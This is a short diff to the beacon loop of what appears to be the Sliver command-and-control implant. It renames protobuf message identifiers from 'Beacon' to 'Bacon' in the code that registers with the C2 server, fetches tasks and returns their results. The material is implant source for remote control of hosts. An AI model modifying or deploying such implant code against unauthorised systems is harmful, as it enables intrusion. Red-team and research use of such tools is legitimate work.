@@ -291,7 +291,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	register := registerSliver()
 	register.ActiveC2 = beacon.ActiveC2
 	register.ProxyURL = beacon.ProxyURL
-	beacon.Send(wrapEnvelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
+	beacon.Send(wrapEnvelope(sliverpb.MsgBaconRegister, &sliverpb.BaconRegister{
 		ID:          InstanceID,
 		Interval:    beacon.Interval(),
 		Jitter:      beacon.Jitter(),
@@ -357,7 +357,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] sending check in ...")
 	// {{end}}
-	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
+	err = beacon.Send(wrapEnvelope(sliverpb.MsgBaconTasks, &sliverpb.BaconTasks{
 		ID:          InstanceID,
 		NextCheckin: int64(beacon.Duration().Seconds()),
 	}))
@@ -383,7 +383,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		// {{end}}
 		return nil
 	}
-	tasks := &sliverpb.BeaconTasks{}
+	tasks := &sliverpb.BaconTasks{}
 	err = proto.Unmarshal(envelope.Data, tasks)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -420,7 +420,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		results = append(results, r)
 	}
 
-	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
+	err = beacon.Send(wrapEnvelope(sliverpb.MsgBaconTasks, &sliverpb.BaconTasks{
 		ID:    InstanceID,
 		Tasks: results,
 	}))
